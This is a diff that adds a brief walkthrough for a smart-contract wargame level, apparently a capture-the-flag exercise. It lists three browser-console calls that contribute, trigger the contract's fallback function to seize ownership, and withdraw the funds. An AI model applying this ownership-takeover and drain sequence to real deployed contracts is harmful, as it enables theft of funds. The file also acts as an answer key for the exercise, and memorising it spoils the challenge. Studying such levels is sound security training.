@@ -1,0 +1,7 @@
+These are the steps needed to complete the level (in the browser console)
+
+await contract.contribute({value:1})
+await contract.sendTransaction({value:1})
+await contract.withdraw()
+
+Use the fallback (receive) function to claim ownership
